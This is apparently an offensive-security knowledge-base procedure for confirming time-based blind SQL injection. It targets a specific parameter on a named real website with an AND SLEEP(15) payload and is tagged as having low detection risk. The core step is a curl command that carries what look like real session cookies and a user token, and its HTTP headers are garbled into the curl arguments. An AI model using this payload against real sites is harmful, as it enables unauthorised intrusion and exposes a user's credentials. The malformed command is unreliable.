---
id: proc-sqli-confirm-sleep15-001
tags:
  - sqli
  - time-based
  - sleep
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/sqli-sleep-15-change-replace-opt]]'
verified: false
platforms:
  - Web
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.960Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm Time-Based SQLi with SLEEP(15)

## Summary

This procedure confirms the time-based blind SQL injection by injecting a 15-second SLEEP payload into the acctid parameter, observing the delayed response to validate MySQL query alteration.

## Description

In a PHP/MySQL environment, unsanitized GET parameters allow attackers to append SQL conditions. The SLEEP(15) function pauses query execution if injected successfully, creating a measurable delay without returning data, ideal for blind scenarios. This confirms the vulnerability and MySQL backend usage.

## Requirements

1. HTTP client capable of timing measurements
2. Target endpoint accessibility
3. Baseline timing from prior requests

## Defense

Defensive measures and detection strategies:

- Parameterize all database queries using PDO or mysqli_prepare
- Rate-limit requests to detect timing attacks
- Log and alert on SQL functions in input

## Objectives

1. Induce and measure a 15-second delay
2. Verify blind injection without errors
3. Confirm exploitation feasibility

## Instructions

### Step 1: Craft and Send Payload Request

**Context**: Append 'AND SLEEP(15)' to acctid to test if the SQL engine executes it.

**Command** ([[commands/sqli-sleep-15-change-replace-opt]]):
```bash
curl -X GET "/changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15)" HTTP/1.1\nHost: www.intensedebate.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://www.intensedebate.com/install-t\nCookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

> Use curl or proxy to time the response; delay indicates success.

### Step 2: Validate Timing

**Context**: Compare to baseline; difference >14 seconds confirms injection.

> No additional command; manual timing check.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqli-sleep-15-change-replace-opt]]

## Tools Used


## Tags

- sqli
- sleep
- timing-attack
